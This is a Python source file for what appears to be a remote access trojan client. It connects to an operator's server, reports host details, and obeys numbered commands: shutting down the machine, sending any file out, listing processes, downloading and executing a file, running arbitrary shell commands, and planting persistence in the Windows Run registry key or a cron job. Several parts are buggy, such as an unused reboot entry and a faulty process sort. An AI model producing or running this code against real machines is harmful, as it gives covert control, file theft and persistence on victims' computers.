#
# client.py
# Matthew Bradley
#
# Requires python3 module psutil to run.
#
# TODO Implement AES encryption
#
import os
import sys
import socket
import psutil
import platform
import subprocess
import tqdm
import getpass
#import ctypes
#import ctypes.wintypes as wintypes
from winreg import *
from crontab import CronTab
from uuid import getnode

BUFF_SIZE = 1024

server = sys.argv[1]
port = sys.argv[2]
hostname = socket.gethostname()
uname = platform.uname()  # Used for getting system info

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((server, int(port)))

    print("Connection established to remote server: " + server + ":" + port)
    s.send(hostname.encode())
    mac = hex(getnode())
    s.send(mac.encode())
    family = platform.system()
    release = platform.release()
    s.send(family.encode())
    s.send(release.encode())
    process = psutil.Process(os.getpid())
    processName = process.name()
    s.send(processName.encode())
    pid = os.getpid()
    s.send(str(pid).encode())
    user = getpass.getuser()
    s.send(user.encode())
    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        cmd = s.recv(BUFF_SIZE).decode()

        if int(cmd) == 1:  # Shutdown command
            if family == "Windows":  # Windows device
                os.system("shutdown /s /t 1")
            else:
                os.system("shutdown now -h")

        elif int(cmd) == 2:  # kill client
            sys.exit()

        elif int(cmd) == 3:  # Return MAC
            mac = hex(getnode())
            s.send(mac.encode())
            process = psutil.Process(os.getpid())
            processName = process.name()
            s.send(processName.encode())
            pid = os.getpid()
            s.send(str(pid).encode())
            user = getpass.getuser()
            s.send(user.encode())
            cwd = os.getcwd()
            s.send(cwd.encode())

        elif int(cmd) == 4:  # upload file to server
            filepath = s.recv(BUFF_SIZE).decode()
            size = os.path.getsize(filepath)
            s.send(str(size).encode())

            progBar = tqdm.tqdm(range(size), f"Sending file: {filepath} to server", unit="B", unit_scale=True,
                                unit_divisor=1024)
            with open(filepath, "rb") as f:
                for _ in progBar:
                    readBytes = f.read(BUFF_SIZE)
                    if not readBytes:  # done
                        break
                    s.send(readBytes)
                    progBar.update(len(readBytes))
            print("File sent.")

        elif int(cmd) == 5:  # get Process List
            processList = psutil.pids()
            processList = sorted(processList, key=lambda processList: process.pid)  # sort process list by PID

            s.send(str(len(processList)).encode())

            i = 0

            while i < len(processList):
                processStr = psutil.Process(processList[i])
                p = str(processStr.pid) + ' ' + processStr.status() + ' ' + processStr.username() + \
                    ' ' + processStr.name()
                s.send(p.encode())
                i += 1
            s.send('done'.encode())

        elif int(cmd) == 6:  # download and execute
            filepath = s.recv(BUFF_SIZE).decode()
            size = os.path.getsize(filepath)
            s.send(str(size).encode())

            progBar = tqdm.tqdm(range(int(size)), f"Receiving file: {filepath} from server", unit="B",
                                unit_scale=True, unit_divisor=1024)
            with open(filepath, "wb") as f:
                for _ in progBar:
                    readBytes = s.recv(BUFF_SIZE)
                    if not readBytes:  # done
                        break
                    f.write(readBytes)
                    progBar.update(len(readBytes))
            print("File received from server....executing")

            os.system(filepath)

        elif int(cmd) == 7:  # run sys command, fails with a DIR command but works with ipconfig????
            command = s.recv(BUFF_SIZE).decode()
            command = command.split()
            proc = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    shell=True)  # Redirects stderr to stdout
            results = proc.communicate()[0]
            s.send(
                results)  # results contains a bytes object with the output/stderr of the command run by subprocess.run

        # elif int(cmd) == 8:  # Migrate to a target process, currently WINDOWS ONLY **PLACEHOLDER** TODO IMPLEMENT THIS
            # targetPid = s.recv(BUFF_SIZE).decode()  # Target PID to migrate to

        elif int(cmd) == 8:  # Persistence, registry for Windows, Crontab for *nix
            if family == 'Windows':  # Do Windows persistence since we're on Windows
                exe = 'python ' + cwd + '\\' + sys.argv[0] + ' ' + sys.argv[1] + ' ' + sys.argv[2]
                key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
                # Create our Run reg key entry using this script and our arguments
                SetValueEx(key, 'client', 0, REG_SZ, exe)
                key.Close()
            else:  # We're on a *nix system, try Cron
                exe = 'python ' + cwd + '/' + sys.argv[0] + ' ' + sys.argv[1] + ' ' + sys.argv[2]
                cron = CronTab(user=user)
                reboot = '@reboot ' + exe  # Make our script run on reboot
                job = cron.new(command=exe)

                cron.write()
            s.send('Success'.encode())

        elif int(cmd) == 0:  # Exit
            exit()

        else:  # Not really distinct from if cmd == 0, but covers invalid command args. just exit
            exit()
